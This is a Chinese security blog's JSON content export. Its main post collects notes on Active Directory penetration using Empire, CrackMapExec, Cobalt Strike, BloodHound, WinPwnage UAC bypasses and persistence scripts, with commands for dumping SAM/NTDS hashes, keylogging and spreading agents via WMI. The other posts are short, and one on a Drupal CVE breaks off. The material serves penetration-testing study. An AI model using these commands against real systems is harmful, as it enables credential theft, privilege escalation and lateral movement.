{"meta":{"title":"shackle","subtitle":null,"description":null,"author":"shackle","url":"https://shackles.top"},"pages":[{"title":"archives","date":"2018-03-30T00:25:32.000Z","updated":"2018-03-30T00:37:52.434Z","comments":true,"path":"archives/index.html","permalink":"https://shackles.top/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-03-30T00:25:45.000Z","updated":"2018-03-30T00:38:17.419Z","comments":true,"path":"categories/index.html","permalink":"https://shackles.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-03-30T00:25:51.000Z","updated":"2018-03-30T00:38:36.445Z","comments":true,"path":"tags/index.html","permalink":"https://shackles.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"中小企业安全管理平台","slug":"Security management platform","date":"2019-01-21T04:52:08.000Z","updated":"2019-02-18T16:37:41.148Z","comments":true,"path":"2019/01/21/Security management platform/","link":"","permalink":"https://shackles.top/2019/01/21/Security management platform/","excerpt":"","text":"中小企业安全管理平台Security management platform 对于中小企业内网安全信息孤岛现象、资产划分不清、各系统闭环导致安全能力低下之间一直是企业安全建设中的痛点，而其对于一个企业网络安全重要性与意义不容忽视。 ​ 故本设计目标实现自动化、一体化安全管理与运营平台，可自定义用户类型及权限信息，有安全人员，运维人员，网络人员和业务人员四种不同等级权限划分。本中小企业内网安全管理平台，包括资产管理，安全扫描，漏洞管理，统一日志分析接口，监控报警接口，知识库共享六大模块。从资产，漏洞，日志，事件四个维度对发现资产进行安全分析可视化展示与管理运营。 资产管理模块实现对目标范围进行探测，现其中存活的端口及资产，梳理资产分布情况，实现资产发现并分组管理并根据实现扩展。 安全扫描模块实现基于插件化的平台对发现资产进行安全检测，根据漏洞评估资产风险状况，保障资产安全性。 漏洞管理模块实现较为完整的漏洞快速跟进和扫描器漏洞过滤。 统一日志分析接口模块对接日志分析系统，实现平台日志管理运营。 监控报警接口模块实现对接监控报警系统，实现监控报警运营。 知识库共享实现知识库与漏洞库的管理与分享，提高安全人员安全软能力。 本平台旨在解决周期巡检困难，安全能力低下，自动化程度低的中小企业，实现安全内部自动化安全管理，提升企业内部安全管理能力，对中小企业安全建设有一定意义。","categories":[],"tags":[{"name":"安全管理平台","slug":"安全管理平台","permalink":"https://shackles.top/tags/安全管理平台/"}]},{"title":"域渗透实战简要总结","slug":"域渗透实战简要总结","date":"2018-10-28T17:03:56.000Z","updated":"2019-02-19T03:34:02.292Z","comments":true,"path":"2018/10/29/域渗透实战简要总结/","link":"","permalink":"https://shackles.top/2018/10/29/域渗透实战简要总结/","excerpt":"","text":"域渗透实战简要总结 本文记录域渗透的一些Tip与坑点，感觉内网渗透，只要英语好，一切都不是事。老外们的技术与分享精神好多干货，学无止境。 不断更新ing~ Empire https://github.com/EmpireProject/Empire ​ Empire是基于Powershell后渗透框架，之前NSA的武器库中就有这个神器。我这里的是2.5版本的，提供rest API，有PHP版本和官方node.js版的前端。但这些GUI都不好用，有不少Bug。另外需要注意的是Empire版本问题，版本的命令可以有所差别,官方文档也是更新不及时。 可参考徐大大的两篇文章，版本是2.3。 一篇文章精通PowerShell Empire 2.3（上）https://www.anquanke.com/post/id/87328 一篇文章精通PowerShell Empire 2.3（下）https://www.anquanke.com/post/id/87333 如下安装命令，官方提供了一键脚本，linux下kali与ubuntu都是支持的。项目原理是类似Metasploit、先建立Listeners，这里话简单看一写它的架构。 ​ 安装很简单，apt下载些包，pip安装python依赖。自动安装，最后需要设置数据库密码。也可以用data，目录下的rest.sh重置数据库。项目结构很清晰。 123456789git clone https://github.com/EmpireProject/Empire.gitcd Empirecd setupsudo ./install.shpython empire --rest --username admin --password password 启动 开启1337端口，rest api。 常用命令 直接help12listentershelp ​ 这里的module，分python版和powershell，不用多说啦，powershell只是用在windows平台下面，modules下面的文件只是python入口文件最后调用的还是data文件夹下面的powershell payload。python版的用在，linux与osx下面。大概分为下面几个大类。需要看到的时候在help就可以了。 模块 https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md 123456789101112code_execution 代码执行collection 信息收集credentials 凭证 exfiltration 数据窃取exploitationlateral_movement 横向management 管理persistence 权限维持privesc 提权recon 侦查situational_awarenesstrollsploit usestager ​ ​ 用Base64解码。看到发送的Python payload，大概的原理是客户端先判断有没有Little Snitch，直接用python2中原生urllib2库请求我们Empire 的http listener，的ip地址端口，这里的listener是由flask提供server，验证客户端来的cookie，相当于模拟正常的web流量。加密混淆建立个长连接。同样Powershell也这个原理。 payload执行后，还要rm。 客户端执行后，agent上线。 接下来就可以进行后渗透攻击。 PSattack：一个渗透测试中使用的万能框架CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ 作者两篇文章，由于文章早点现在这些命令有些不同。 https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html 这个项目是一些之前的项目的集成、 1234567891011ImpacketPywinrmPywerviewPowerSploitInvoke-ObfuscationInvoke-VncMimikittenzNetRipperRandomPS-ScriptsSessionGopherMimipenguin kali 下面一键安装 1apt-get install crackmapexec 值得注意的是项目的cmedb 命令可以用Empire的 Rest Api 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778crackmapexec 参数： target 包含目标列表的目标IP，范围，CIDR（s），主机名，FQDN或文件可选参数： -h,--help 显示此帮助消息并退出 -v,--version 显示程序的版本号并退出 -t THREADS 设置要使用的并发线程数（默认值：100） -id CRED_ID [CRED_ID ...] 用于身份验证的数据库凭据ID -u USERNAME [USERNAME ...] 用户名或包含用户名的文件 -d DOMAIN 域名 --local-auth在本地验证每个目标 -p PASSWORD [PASSWORD ...] 包含密码的密码或文件 -H HASH [HASH ...] NTLM哈希值或包含NTLM哈希值的文件 -M MODULE， --Module模块 Payload模块使用 -o MODULE_OPTION [MODULE_OPTION ...] 有效载荷模块选项 -L，--list-modules列出可用模块 --show-options 显示模块选项 --share SHARE 指定共享（默认值：C $） --smb-port &#123;139,445&#125; SMB端口（默认值：445） --mssql-port PORT MSSQL端口（默认值：1433） --server &#123;http，https&#125; 使用所选服务器（默认值：https） --server-host HOST IP将服务器绑定到（默认值：0.0.0.0） --server-port PORT 在指定端口上启动服务器 --timeout TIMEOUT 每个线程的最大超时时间（秒）（默认值：20） --gfail-limit LIMIT全局失败登录尝试的最大数量 --ufail-limit LIMIT每个用户名的最大失败登录尝试次数 --fail-limit LIMIT每个主机的最大失败登录尝试次数 --verbose启用详细输出凭证收集： 收集凭据的选项 --sam Dump来自目标系统的SAM哈希值 --lsa从目标系统中转储LSA的秘密 --ntds &#123;vss，drsuapi&#125;使用指定的方法从目标DC转储NTDS.ditdrsuapi是最快的） --ntds-history转储NTDS.dit密码历史记录 --ntds-pwdLastSet显示每个NTDS.dit帐户的pwdLastSet属性 --wdigest &#123;enable，disable&#125; 创建/删除'UseLogonCredential'注册表项，在Windows上启用WDigest信用转储&gt; = 8.1制图/枚举： 映射/枚举选项 --shares枚举共享和访问权限 --uac检查UAC状态 --sessions枚举活动会话 --disks枚举磁盘 --users枚举用户 --rid-brute [MAX_RID] 通过强制RID枚举用户（默认值：4000） --pass-pol转储密码策略 --lusers枚举已登录的用户 --wmi QUERY发出指定的WMI查询 --wmi-namespace NAMESPACEWMI命名空间（默认值：//./root/cimv2）爬虫： 爬虫的选择 --spider [FOLDER]文件夹到蜘蛛（默认：根目录） --content启用文件内容搜索 --exclude-dirs DIR_LIST目录排除蜘蛛 --pattern PATTERN [PATTERN ...]要在文件夹，文件名和文件内容中搜索的模式 --regex REGEX [REGEX ...]正则表达式搜索文件夹，文件名和文件内容 --depth DEPTH Spider递归深度（默认值：10）命令执行： 执行命令的选项 --exec-method &#123;smbexec，wmiexec，atexec&#125; 执行命令的方法。在MSSQL模式下忽略（默认值：wmiexec） --force-ps32强制PowerShell命令在32位进程中运行 --no-output不检索命令输出 -x COMMAND执行指定的命令 -X PS_COMMAND执行指定的PowerShell命令MSSQL交互： 与MSSQL DB交互的选项 --mssql将crackmapexec切换到MSSQL模式。如果提供凭据，则将对所有发现的MSSQL DB进行身份验证 --mssql-query QUERY对MSSQL DB执行指定的查询 --mssql-auth &#123;windows，normal&#125;要使用的MSSQL身份验证类型（默认值：windows） 主要还是以下这些模块。 12345678910111213[*] empire_exec 使用Empire的RESTful API为指定的侦听器生成启动器并执行它[*] mimikittenz 执行Mimikittenz[*] rundll32_exec 使用rundll32和Windows的本机JavaScript解释器执行命令[*] shellinject 下载指定的原始shellcode并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存[*] com_exec 使用COM scriptlet执行命令以绕过白名单[*] enum_chrome 使用Powersploit的Invoke-Mimikatz.ps1脚本解密已保存的Chrome密码[*] tokens 使用Powersploit的Invoke-TokenManipulation枚举可用的令牌[*] mimikatz 执行PowerSploit的Invoke-Mimikatz.ps1脚本[*] powerview Wrapper for PowerView的功能[*] peinject 下载指定的DLL/EXE并使用PowerSploit的Invoke-ReflectivePEInjection.ps1脚本将其注入内存[*] tokenrider 允许使用权限而不是转储凭据进行自动令牌枚举，模拟和大规模横向传播[*] metinject 下载Meterpreter stager并使用PowerSploit的Invoke-Shellcode.ps1脚本将其注入内存[*] eventvwr_bypass 使用eventvwr.exe无文件UAC绕过执行命令 Bloodhound 域攻击关系图 https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collection-Intro https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ https://www.youtube.com/watch?v=lxd2rerVsLo python 客户端https://github.com/fox-it/BloodHound.py 1apt-get install bloodhound 基于 Neo4j数据库,需要改密码。 1neo4j console 在终端上执行,GUI界面，输入数据库的地址、端口用户密码。可以多客户端使用，跨平台。 1bloodhound CobaltStrke 列表集合https://github.com/invokethreatguy/CSASC Cobalt Strike 的一些好用的插件，可以让我们更加清楚和方便的进行工作。 Bean COMMAD123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596EDR_Query 查询所有安装的主要EDR产品的系统ProcessMonitor 启动/停止并更改进程监视器的间隔时间RedRepo 一个庞大的命令库和红色团队提示audit_uac 审核BypassUAC方法成功的主机browserpivot 设置浏览器数据透视会话bypassuac 在高完整性过程中生成会话cancel 取消正在进行的下载cd 更改目录check_msbuild 在目标上查找.NET v4.0.30319checkin 致电主页并发布数据clear 明确的Bean队列com-exec 使用DCOM进行横向运动covertvpn 部署隐蔽VPN客户端cp 复制文件dcsync 从DC中提取密码哈希desktop 桌面查看目标桌面并与之交互dllinject 将反射DLL注入进程dllload 使用LoadLibrary（）将DLL加载到进程中download 下载文件downloads 列出正在进行的文件下载drives 列出目标驱动器elevate 提升尝试提升权限execute 执行目标执行程序（无输出）execute-assembly 在目标上执行内存中的本地.NET程序exit 终止Bean会话getprivs 启用当前令牌的系统权限getsystem 尝试获取SYSTEMgetuid 获取用户IDhashdump 转储密码哈希值help 帮助菜单inject 在特定进程中注入一个会话jobkill 杀死一个长期的后期开发任务jobs 列出长期运行的后期开发任务kerberos_ccache_use 将缓存中的kerberos票证应用于此会话kerberos_ticket_purge 从本次会议中清除kerberos门票kerberos_ticket_use 将kerberos票证应用于此会话keylogger 键盘记录器将键击记录器注入进程kill 杀死一个进程link 通过SMB连接到Beacon对等端logonpasswords 使用mimikatz转储凭据和哈希值ls 列出文件make_token 创建令牌以传递凭据mimikatz 运行mimikatz命令mkdir 制作一个目录mode dns 使用DNS A作为数据通道（仅限DNSBean）mode dns-txt 使用DNS TXT作为数据通道（仅限DNSBean）mode dns6 使用DNS AAAA作为数据通道（仅限DNSBean）mode http 使用HTTP作为数据通道mode smb 使用SMB对等通信mv 移动文件net 网络和主机枚举工具note 为此Beacon分配注释persitence 为Bean添加或删除持久性功能portscan 扫描网络以获取开放服务powerpick 通过Unmanaged PowerShell执行命令powershell 通过powershell.exe执行命令powershell-import 导入powershell脚本ppid 为生成的post-ex作业设置父PIDps 显示进程列表psexec 使用服务在主机上生成会话psexec_psh 使用PowerShell在主机上生成会话psinject 在特定进程中执行PowerShell命令pth 使用Mimikatz传递哈希pwd 打印当前目录reg 查询注册表rename_msbuild 创建无辜的MSBuild.exe副本rev2self 恢复原始令牌rm 删除文件或文件夹rportfwd 向前设置反向端口run 在目标上执行程序（返回输出）runas 以另一个用户身份执行程序runasadmin 在高完整性上下文中执行程序runu 在另一个PID下执行程序screenshot 截取屏幕截图sendtoempire 将当前Beacon会话发送到已配置的Empire服务器setenv 设置环境变量shell 通过cmd.exe执行命令shinject 将shellcode注入进程shspawn 生成进程并将shellcode注入其中sleep 设置Bean睡眠时间socks 启动SOCKS4a服务器以中继流量socks stop 停止SOCKS4a服务器spawn 产生一个会话spawnto 设置可执行文件以生成进程spawnu 在另一个PID下产生一个会话ssh 使用SSH在主机上生成SSH会话ssh-key 使用SSH在主机上生成SSH会话steal_token 从进程中窃取访问令牌timestomp 将时间戳从一个文件应用到另一个文件type 显示文件的内容unlink 断开与父Beacon的连接upload 上传文件wimgest 使用mimikatz转储明文凭据winrm 使用WinRM在主机上生成会话wmi 使用WMI在主机上生成会话wmi_msbuild wmi横向运动没有powershell 一些好用的脚本 后续有时间再整理整理。 1234567891011121314151617181920CertUtilWebDelivery.cna Logging PowerLessShell ProcessMonitor.ps1 SMBPayloadGenerator.cnaArtifactPayloadGenerator.cna DriverSearcher logvis.cna PowerView3-Aggressor UACBypassAVQuery.cna EDR.cna Persistence ProcessColor.cna RedTeamRepo.cna Beaconpire ElevateKit persistence-aggressor-script ProcessMonitor.cna silver-tickets.cna ArtifactPayloadGenerator.cna 根据HTTP/HTTPS侦听器生成每种类型的无阶段/分阶段 Payload 创建/opt /cobaltstrike/Staged_Payloads，/opt/cobaltstrike/Stageless_Payloads AVQuery.cna 使用PowerShell在目标上查询所有安装的AV，以查询注册表 快速简便地获取您作为攻击者处理的AV CertUtilWebDelivery.cna 使用CertUtil.exe的无级Web传送 Powerpick用于生成certutil.exe以下载目标上的无阶段 Payload并使用rundll32.exe执行 RedTeamRepo.cna 一个常见的操作系统命令集合，以及当您手头没有Google或RTFM时的红色团队提示。 ProcessColor.cna 彩色输出 Red Team Persistence UserSchtasksPersist.cna 用户Schtasks作为所选Bean的当前用户运行的持久性 意味着在初始访问时快速用户级持久性 ServiceEXEPersist.cna 管理级自定义服务EXE持久性 作为所选Bean的提升用户/ SYSTEM运行 WMICEventPersist.cna 使用WMIC为选定的Bean生成系统级别持久性的自定义WMI事件 语法很重，在使用实时目标之前首先测试 WMIEventPersist.cna 使用PowerShell为选定的Bean生成SYSTEM级别持久性的自定义WMI事件 语法很重，在使用实时目标之前首先测试 StartupGPOPersist.cna 在psscripts.ini中生成本地GPO条目，以调用.ps1脚本文件以在选定的Bean上保持持久性 以SYSTEM身份回拨 在执行之前首先使用GPO枚举（成功的GroupPolicy目录列表）检查权限 Bean执行将导致winlogon.exe挂起，最终用户无法登录。一旦新的Bean检入注入另一个进程并杀死原始。更新即将推出。 RegistryPersist.cna 根据所选Bean的用户输入创建自定义注册表项，值，类型和 Payload位置 HKCURunKeyPSRegistryPersist.cna 在HKCU中创建两个自定义注册表运行密钥条目 Payload是基于HTTP/HTTPS侦听器的base64编码的PowerShell Payload Bitsadmin.cna 创建在重新引导时执行的bitsadmin作业 目前适用于Windows 7,8，Server 2008，Server 2012 Kits 工具包这里的大多数有用的脚本都是用工具包组织的。您所要做的就是加载KitLoader.cna脚本，它将自动加载所有其他工具包（execpt DebugKit）。 AnnoyKit 此套件中的操作围绕杂项乐趣，通常涉及弄乱用户 AntiForensicsKit 该套件中的行动围绕抗辩护理。如果它减慢了调查员的速度，它很可能属于这个套件。我们都知道抗辩法是最好的取证。 CredKit 凭证获取 此工具包中的操作围绕凭证窃取，无论是通过内存抓取还是读取文件。如果涉及窃取密码，则应该在此处。 DebugKit 此工具包仅限于我用于开发和调试的操作，因此不会加载其余部分。 EnumKit 此工具包中的操作围绕主机和网络枚举。凭证枚举操作应该使用CredKit。 PersistKit 此工具包中的操作围绕端点持久性。示例包括后门服务创建，后门进程创建等 PrivEscKit 提权 此工具包中的操作围绕端点权限提升。涉及强制扫描的动作（powerup.ps1，unix-privesc-check）应该放在apporiate部分 ThirdParty 这只是其他人创建的.cna脚本的随机集合，我喜欢使用它们。我只是装载了kitloader以便于传送。可能会对第三方脚本进行更改，以便更好地与我的工作流程集成。 NoPowerShell https://github.com/bitsadmin/nopowershell NoPowerShell是一个用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。可以在Cobalt Strike中加载此.NET Framework 2兼容二进制文件，以在内存中执行命令。不System.Management.Automation.dll使用; 只有原生的.NET库。 此外，该项目使每个人只需使用几行C＃代码即可轻松扩展其功能。 PowerViewhttps://github.com/tevora-threat/PowerView3-Aggressor BloodHound 联动插件https://github.com/vysec/ANGRYPUPPY 提权脚本UAC Bypass https://github.com/RhinoSecurityLabs/Aggressor-Scripts 在不调用powershell.exe的情况下运行PowerShell命令 https://github.com/Mr-Un1k0d3r/PowerLessShell 提权 https://github.com/rsmudge/ElevateKit 12345ms15-051ms16-016ms16-032：辅助登录句柄权限提升（CVE-2016-099）uac-eventvwruac-wscript UACME BypassUAC的总结 https://github.com/hfiref0x/UACME alphalab 总结：白名单绕过UAC方法原理介绍 https://www.freebuf.com/vuls/183914.html https://www.v2ex.com/t/358133?p=1 http://www.fuzzysecurity.com/tutorials/27.html 基本原理： 各类UAC白名单程序的DLL劫持 各类提升权限的COM接口利用 Akagi 也就是主要的Bin，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。 Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码 Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法 Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码 Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码 Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码 Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件 Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了 Naka 又叫做“空气”，压缩及亦或编码的小工具源码 Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具 WinPwnage Bypass UAC、权限维持 好用。python写的、py2exe编译exe https://github.com/rootm0s/WinPwnage UAC绕过 UAC绕道使用fodhelper UAC绕过使用computerdefaults UAC绕过使用slui UAC绕过使用silentcleanup UAC绕过使用compmgmtlauncher 使用sdclt进行UAC绕过（isolatedcommand） UAC绕过使用sdclt（App Paths） UAC绕过使用perfmon UAC使用eventviewer绕过 使用sysprep进行UAC绕过（支持dll Payload） UAC绕过使用migwiz（支持dll Payload） 使用mcx2prov进行UAC绕过（支持dll Payload） 使用cliconfg进行UAC绕过（支持dll Payload） 权限维持 使用userinit密钥权限维持 使用图像文件执行选项和放大镜的持久性 使用hkey_local_machine运行键的持久性 使用hkey_current_user运行键的持久性 使用schtask的持久性（SYSTEM权限） 使用资源管理器dll劫持的持久性 使用mofcomp和mof文件的持久性（SYSTEM权限） 使用wmic的持久性（SYSTEM权限） 使用启动文件的持久性 持久性使用Cortana App 使用People App的持久性 1、扫描可以提权的uac列表，绿色是可以提权的payload。 1python winpwnage.py -scan -uac 2、扫描可以权限维持的persist列表，绿色是可以提权的payload。 1python winpwnage.py -scan -persist python winpwnage.py -use -uac ID号 C:\\Windows\\System32\\cmd.exe 3、弹出管理员cmd.exe pupy 开源远控 https://github.com/n1nj4sec/pupy 工具联动一些自动化工具Death Star 自动化工具 https://github.com/SadProcessor/EmpireDog https://www.youtube.com/watch?v=iMoFORL2fpQ 基于Empire API，下拉agent，自动的使用Empire Api进行横向渗透、后渗透。 原理是作者博客上的那种图，一些常见的内网域渗透思路。 实验了下，还是挺自动化的。就是遍历一些常见的攻击方式。 EmpireDog https://github.com/SadProcessor/EmpireDog EmpireDog，是用powershell联动Empire、BloodHound的一套工具。 安装步骤： 把github上四个文件夹下到 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules中。 分布Import-Modules 将CustomCypher.txt内容添加到BH Custom Queries / Map Empire Get-Command -Module | Get-Help -Examples 基本流程： Empire–&gt;PowerEmpire–&gt; DogStrike_–&gt; CypherDog–&gt;BloodHound–&gt;权限 第一步 Empire API交互PowerEmpire和EmpireStrike可与Empire服务器进行交互 通过帝国API。 PowerEmpire不需要EmpireStrike。 EmpireStrike是PowerEmpire上的一个包装器。 12./empire --headless --username *user* --password *password*./empire --rest --username *user* --password *password* PowerEmpirePowerEmpire是一个PowerShell模块，用于与Empire的API进行交互 特征 27个与Empire Server交互的Cmdlet 通过会话控制多个服务器 用PowerShell做吧！ Credits PowerEmpire由DarkOperator编写（@Carlos_Perez） 更多信息 https://gitlab.com/carlos_perez/PowerEmpire/wikis/home 1234567891011121314151617＃安装模块Set-ExecutionPolicy UnRestrictedImport-Module PowerEmpire2.0_DogMod＃连接到服务器New-EmpireSession -ComputerName &lt;IP&gt; -Credential &lt;用户名&gt; -NoSSLCheckNew-EmpireSession -ComputerName 192.168.10.130 -Credential admin -NoSSLCheck＃检查命令Get-Command -Module PowerEmpire2.0_dogMod#RTFMGet-Help *&lt;CommandName&gt;* -Full 注意： 导入EmpireStrike模块也将导入PowerEmpire并要求 初始服务器设置，所以你现在可以跳过这一切 EmpireStrikeEmpireStrike是PowerEmpire的一个包装器，语法短。 EmpireStrike Cmdlet使用PowerEmpire命令。 特征 17个具有短语法的Cmdlet Tab-Completion / Dynamic Params 管道输入/多个目标 ISE额外服务 安装 导入EmpireStrike还将导入PowerEmpire。 命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#import Module（也导入PowerEmpire2.0_DogMod）Import-Module EmpireStrike2.0## Session# Check Current SessionSession ? ## Agents# Check selected agentsAgent ?# Agent list for current sessionAgent *# Set agentAgent ABCDE123# Check selected agentAgent ?# More detailsAgent ??# Multiple TargetsAgent * | CommandX '$env:COMPUTERNAME'# Get ResultsAgent * | Result## Modules# Check selected moduleModule ?# List all ModulesModule *# Search ModuleModuleSearch wallpaper# Set ModuleModule powershell/trollsploit/wallpaper# or ComboModule (ModuleSearch wallpaper).name# Check options for selected moduleOption ?# With descriptionOption *# Set optionOption LocalImagePath \"/root/Pictures/wallpapers/wllppr.jpg\"# Check optionsOption ?## Strike# View Strike DetailsStrike ?# StrikeStrike# Multiple Targets# Change wallpaper to all agents in selected sessionSession 0Module (ModuleSearch wallpaper).nameOption LocalImagePath '/root/Pictures/wallpapers/wllppr.jpg'Agent * | StrikeX## RTFM# More Stuff...Get-command -Module EmpireStrike2.0 | Get-Help | select Name,Synopsis# ExamplesGet-Help &lt;CommandName&gt; -Examples https://www.youtube.com/watch?v=eok_NgFOnmc 第二部- 与BloodHound API交互CypherDogCypherDog是一个用于将Cypher查询发送到BloodHound API的模块。 1234567891011121314151617181920212223# Import ModuleImport-Module CypherDog1.3# Query NodeNode -User ACHAVARIN@EXTERNAL.LOCALNodeSearch -Computer Secret# Query EdgeEdge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return UsersEdge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users -Degree *# Pipeline ComboEdge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |Edge -MemberOfGroup -Return Users | measureEdge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |Edge -MemberOfGroup -Return Users -degree * | measure# Query Edge ReverseEdgeR -ParentOfUser ACHAVARIN@EXTERNAL.LOCAL -Return Groups# Query PathPath -UserToGroup -From ACHAVARIN@EXTERNAL.LOCAL -To `'DOMAIN ADMINS@INTERNAL.LOCAL'## RTFM &gt;&gt; Create/Delete/Update Nodes/Edges# List all Module CommandsGet-command -Module CypherDog1.3 | Get-Help | Select Name,Synopsis# Get Help for specific commandGet-Help &lt;CommandName&gt; -full 视频 https://www.youtube.com/watch?v=SPgkgeOY40Y 第三部 联动BloodHound和EmpireDogStrikeDogStrike是一系列用于协调的cmdlet BloodHound / Empire，使用PowerEmpire / EmpireStrike / CypherDog的cmdlet。 还包括自定义密码查询，以将帝国图形化为BloodHound中的节点。 特征 自动映射帝国和图表+循环更新显示 自动提升/生成/传播代理 自动清洁会话/图表（陈旧） - DIY框架 使用PowerShell作为攻击性自动化框架…… 命令 1234567891011121314151617181920# Import Module (Also Imports EmpireStrike/PowerEmpire/CypherDog)Import-Module DogStrike2.13# List all commandsgcm -Mod DogStrike2.13 | Get-Help | Select Name,SynopsisName Synopsis---- --------Invoke-DogBark Add Speech to automationsInvoke-DogBite Return Listener &amp; Session for input AgentInvoke-DogClock Check Agent last checkin timeInvoke-DogElevate Elevate Agent via empire moduleInvoke-DogFetch Bulk Add Properties to NodesInvoke-DogMap Map Empire Nodes in BloodHound GraphInvoke-DogPass Pass Agent to another Server/listenerInvoke-DogSearch Search Empire Nodes onlyInvoke-DogSpawn Spawn agent via empire moduleInvoke-DogSpread Spread agent via WMIInvoke-DogWatch Map/Update Empire Agents (loopable)Invoke-DogWipe Remove Stale Agents/Nodes# Help for Specific CommandGet-Help &lt;CommandName&gt; -full 视频 https://www.youtube.com/watch?v=IcbCYy7IiNE https://www.youtube.com/watch?v=bDm1zR2W4w0 https://www.youtube.com/watch?v=a4EtEY37ImQ 注意 导入DogStrike还会导入PowerEmpire + EmpireStrike和CypherDog。 附录 Dummy DIY Cmdlet - 多个目标的模块组合 CMDLET 12345678910111213141516171819202122232425262728293031323334353637## CMDLET&lt;# SHOW ME WHAT YOU GOT! #&gt;Function Invoke-ShowMeWhatYouGot&#123; [CmdletBinding()] [Alias('ShowMeWhatYouGot')] Param( # Agent Name (Accepts multiple &amp; Pipeline) [parameter(Mandatory=$true,ValueFromPipeline=$True)][String[]]$Agent, # Path to Wallpaper (on Empire Server) [Parameter(Mandatory=$true)][Alias('Image')][String]$ImagePath, # Video URL (if other than Get-Schwifty) [Parameter(Mandatory=$false)][String]$VideoURL ) Begin&#123;&#125; Process&#123; Foreach($Agt in $Agent)&#123; # Set Target Agent DogBite -Agent $Agt -Select # trollsploit/wallpaper Module powershell/trollsploit/wallpaper Option LocalImagePath $ImagePath Strike -Agent $Agt -Blind # trollsploit/get-swchifty Module powershell/trollsploit/get_schwifty if($VideoURL)&#123;Option VideoURL $VideoURL&#125; Strike -Agent $Agt -Blind &#125; &#125; End&#123; # Quote the Giant Head DogBark \"I Like what You Got... Good Job.\" -Rate -3 -Async &#125; &#125;## ACTION (All Agent Nodes)# Shumshumschilpiddydah!$Schwifty = '/root/Pictures/wallpapers/Get-Schwifty.png'DogSearch -Agent | ShowMeWhatYouGot -Image $Schwifty 参考https://github.com/SadProcessor/EmpireDog https://github.com/EmpireProject https://github.com/EmpireProject/Empire/wiki https://adaptiveempire.slack.com https://gitlab.com/carlos_perez/PowerEmpire https://github.com/BloodHoundAD/BloodHound https://github.com/BloodHoundAD/BloodHound/wiki https://bloodhoundhq.slack.com https://blog.cptjesus.com/posts/introtocypher https://posts.specterops.io/ http://porterhau5.com/blog/ https://adsecurity.org/","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://shackles.top/tags/内网渗透/"}]},{"title":"内网渗透归纳总结-思维导图","slug":"思维导图-内网渗透归纳总结-思维导图","date":"2018-10-22T17:03:56.000Z","updated":"2019-02-19T03:44:07.709Z","comments":true,"path":"2018/10/23/思维导图-内网渗透归纳总结-思维导图/","link":"","permalink":"https://shackles.top/2018/10/23/思维导图-内网渗透归纳总结-思维导图/","excerpt":"","text":"内网渗透归纳总结-思维导图 内网渗透归纳总结-思维导图 不断更新ing~","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://shackles.top/tags/内网渗透/"}]},{"title":"Web安全漏洞与防御归纳总结-思维导图","slug":"思维导图-Web安全漏洞与防御的知识归纳总","date":"2018-10-19T17:03:56.000Z","updated":"2019-02-19T03:44:08.140Z","comments":true,"path":"2018/10/20/思维导图-Web安全漏洞与防御的知识归纳总/","link":"","permalink":"https://shackles.top/2018/10/20/思维导图-Web安全漏洞与防御的知识归纳总/","excerpt":"","text":"Web安全漏洞与防御归纳总结-思维导图 Web安全漏洞与防御的知识归纳总结。 不断更新ing~","categories":[],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://shackles.top/tags/Web安全/"}]},{"title":"运维安全-思维导图","slug":"思维导图-运维安全","date":"2018-10-08T17:03:56.000Z","updated":"2019-02-19T03:44:07.138Z","comments":true,"path":"2018/10/09/思维导图-运维安全/","link":"","permalink":"https://shackles.top/2018/10/09/思维导图-运维安全/","excerpt":"","text":"运维安全-思维导图 运维安全-思维导图 更新中~","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://shackles.top/tags/内网渗透/"}]},{"title":"Drupal远程代码执行漏洞CVE-2018-7600","slug":"Drupal远程代码执行漏洞(CVE-2018-7600)","date":"2018-04-13T15:53:56.000Z","updated":"2019-02-19T03:32:11.944Z","comments":true,"path":"2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/","link":"","permalink":"https://shackles.top/2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/","excerpt":"","text":"Drupal远程代码执行漏洞CVE-2018-76000x00 漏洞分析12号国外大佬发了CVE-2018-7600的漏洞POC，CVE-2018-7600远程代码执行漏洞的原因是由于Drupal对表单的渲染。 